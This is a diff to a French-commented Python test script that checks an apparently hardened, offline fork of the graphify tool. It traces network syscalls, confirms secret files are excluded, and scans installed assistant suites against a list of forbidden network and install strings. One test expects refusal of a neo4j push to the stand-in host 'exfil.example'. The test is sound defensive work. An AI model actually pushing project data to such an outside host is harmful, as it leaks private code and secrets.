@@ -173,28 +173,64 @@ def main() -> int:
         results.append((label, ok, detail))
         return res
 
-    # Pipeline Kiro complet (le sous-agent est simule)
-    run("kiro install", ["kiro", "install"])
-    res = run("kiro prepare", ["kiro", "prepare", "."])
-    plan_path = corpus / "graphify-out" / "kiro" / "plan.json"
-    if plan_path.exists():
-        plan = json.loads(plan_path.read_text(encoding="utf-8"))
-        for c in plan["chunks"]:
-            nodes = [{"id": f"n{i}", "label": f"Concept {i}", "file_type": "document", "source_file": f["source_file"]}
-                     for i, f in enumerate(c["files"])]
-            Path(c["output"]).write_text(json.dumps({"nodes": nodes, "edges": [], "hyperedges": [],
-                                                     "coverage": {f["source_file"]: f["lines"] for f in c["files"]}}),
-                                         encoding="utf-8")
-        excluded_ok = "acces.md" in res.stdout and not any(
-            "acces.md" in f["source_file"] or ".env" in f["source_file"] for c in plan["chunks"] for f in c["files"])
-        results.append(("documents avec secret exclus des missions", excluded_ok, ""))
-    run("kiro finalize", ["kiro", "finalize"])
-    labels = corpus / "graphify-out" / "kiro" / "labels.json"
-    labels.parent.mkdir(parents=True, exist_ok=True)
-    labels.write_text('{"0": "Facturation"}', encoding="utf-8")
-    run("kiro labels", ["kiro", "labels", str(labels)])
-    run("kiro prepare --update", ["kiro", "prepare", ".", "--update"])
-    run("kiro verify", ["kiro", "verify"])
+    # Interpreteur de graphify (shebang du lanceur pip) : les skills lancent
+    # `python -c "from graphify..."` avec cet interpreteur.
+    head = graphify.read_bytes()[:300].split(b"\n", 1)[0]
+    python = head[2:].decode().strip().split()[0] if head.startswith(b"#!") else sys.executable
+
+    def run_py(label: str, code: str, netns: bool = False) -> subprocess.CompletedProcess:
+        trace = work / f"trace-{len(results):02d}.txt"
+        cmd = ["strace", "-f", "-qq", "-e", "trace=socket,connect,sendto,sendmsg", "-o", str(trace), python, "-c", code]
+        if netns:
+            cmd = ["unshare", "-n", *cmd]
+        res = subprocess.run(cmd, cwd=corpus, env=env, capture_output=True, text=True, timeout=600)
+        bad = network_syscalls(trace)
+        ok = not bad and res.returncode == 0
+        detail = "; ".join(bad[:2]) if bad else ("" if ok else (res.stderr or res.stdout)[-200:].replace("\n", " "))
+        results.append((label, ok, detail))
+        return res
+
+    # Suites des assistants (comme graphify d'origine) : rien de dangereux ecrit
+    forbidden = ("pip install graphifyy -q", "uv tool install --upgrade graphifyy", "uv tool run --from graphifyy",
+                 "uv run --with graphifyy", 'backend="gemini"', "extract_corpus_parallel(", "from graphify.ingest import",
+                 "from graphify.transcribe import", "push_to_neo4j(", '"mcpServers"', "github.com/sponsors")
+    for label, args in [("install claude (projet)", ["install", "--platform", "claude", "--project"]),
+                        ("codex install", ["codex", "install"]), ("kiro install", ["kiro", "install"]),
+                        ("gemini install", ["gemini", "install"]),
+                        ("install copilot (global)", ["install", "--platform", "copilot"])]:
+        run(label, args)
+    dirty = [f"{p.name}:{n}" for base in (corpus, Path(env["HOME"])) for p in base.rglob("*")
+             if p.is_file() and "graphify-out" not in p.parts
+             for n in forbidden if n in p.read_text(encoding="utf-8", errors="replace")]
+    results.append(("suites installees sans PyPI / IA externe / reseau", not dirty, ", ".join(dirty[:4])))
+
+    # Pipeline des skills (les sous-agents de l'assistant sont simules)
+    res = run_py("skill : detection des fichiers", (
+        "import json; from pathlib import Path; from graphify.detect import detect; "
+        "r = detect(Path('.')); Path('graphify-out').mkdir(exist_ok=True); "
+        "Path('graphify-out/.graphify_detect.json').write_text(json.dumps(r)); "
+        "print(json.dumps({'sensitive': r.get('skipped_sensitive', []), 'docs': r['files'].get('document', [])}))"))
+    try:
+        info = json.loads(res.stdout.strip().splitlines()[-1])
+        excluded_ok = (any("acces.md" in x for x in info["sensitive"])
+                       and not any("acces.md" in x or ".env" in x for x in info["docs"]))
+    except Exception:
+        excluded_ok = False
+    results.append(("documents avec secret exclus de l'extraction", excluded_ok, ""))
+    run_py("skill : extraction du code + graphe + rapport", (
+        "import json; from pathlib import Path; "
+        "from graphify.extract import collect_files, extract; from graphify.build import build_from_json; "
+        "from graphify.cluster import cluster, score_all; from graphify.analyze import god_nodes, surprising_connections; "
+        "from graphify.report import generate; from graphify.export import to_json; "
+        "d = json.loads(Path('graphify-out/.graphify_detect.json').read_text()); "
+        "files = [p for f in d['files'].get('code', []) for p in (collect_files(Path(f)) if Path(f).is_dir() else [Path(f)])]; "
+        "ext = extract(files, cache_root=Path('.'), root=Path('.')); "
+        "ext['nodes'].append({'id': 'concept_facturation', 'label': 'Facturation', 'file_type': 'document', 'source_file': 'docs/notes.md', '_origin': 'semantic'}); "
+        "G = build_from_json(ext, root='.'); c = cluster(G); coh = score_all(G, c); "
+        "to_json(G, c, 'graphify-out/graph.json', force=True); "
+        "Path('graphify-out/GRAPH_REPORT.md').write_text(generate(G, c, coh, {k: 'Community %d' % k for k in c}, "
+        "god_nodes(G), surprising_connections(G, c), d, {'input': 0, 'output': 0}, '.'))"))
+    run("verify", ["verify"])
 
     # Commandes locales
     for label, args in [
@@ -217,15 +253,16 @@ def main() -> int:
         ("--backend refuse", ["extract", ".", "--backend", "openai"]),
         ("push neo4j refuse", ["export", "neo4j", "--push", "bolt://exfil.example:7687"]),
         ("prs refuse", ["prs"]), ("global refuse", ["global", "list"]),
-        ("install claude refuse", ["claude", "install"]),
     ]:
         run(label, args, expect_rc=2)
 
     # Hors ligne complet
     if shutil.which("unshare") and os.geteuid() == 0:
         shutil.rmtree(corpus / "graphify-out", ignore_errors=True)
-        run("hors ligne : kiro prepare", ["kiro", "prepare", "."], netns=True)
-        run("hors ligne : kiro finalize", ["kiro", "finalize"], netns=True)
+        run_py("hors ligne : detection + extraction", (
+            "from pathlib import Path; from graphify.detect import detect; from graphify.extract import extract; "
+            "r = detect(Path('.')); extract([Path(f) for f in r['files'].get('code', [])], cache_root=Path('.'), root=Path('.'))"), netns=True)
+        run("hors ligne : update", ["update", "."], netns=True, expect_rc=None)
         run("hors ligne : query", ["query", "facturation"], netns=True, expect_rc=None)
     else:
         results.append(("hors ligne (unshare -n)", True, "non execute (root + unshare requis)"))
